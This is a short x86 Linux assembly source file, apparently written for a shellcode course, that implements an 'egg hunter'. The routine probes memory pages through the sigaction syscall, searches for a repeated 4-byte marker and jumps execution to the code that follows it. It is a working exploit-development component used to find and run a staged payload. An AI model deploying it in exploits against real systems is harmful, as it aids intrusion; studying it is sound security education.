; Title: Egg Hunter - Linux x86 
; Author: DeathsPirate
; Twitter: @DeathsPirate
; Web: https://whitehatters.academy
; StudentID: SLAE-734

global _start

section .text

_start:
align_page:
    or cx,0xfff         ; Setup the page alignment

next_address:
    inc ecx		; Increment our page alignment 
    push byte +0x43     ; Push 67 onto the stack (sigaction syscall number)
    pop eax             ; Set eax to 67
    int 0x80            ; Make the syscall - sigaction
    cmp al,0xf2         ; Did sigaction return EFAULT?
    jz align_page       ; If it did it's an invalid pointer, try the next one
    mov eax, 0xF8F9F8F9 ; Store our Egg Key in eax
    mov edi, ecx        ; Move ecx into edi (address to validate)
    scasd               ; Compare eax / edi and increment edi by 4 bytes
    jnz next_address    ; If it didn't match try the next address
    scasd               ; If it did try the next 4 bytes
    jnz next_address    ; Next 4 bytes didn't match try next address
    jmp edi             ; We found our egg identifier, pass execution

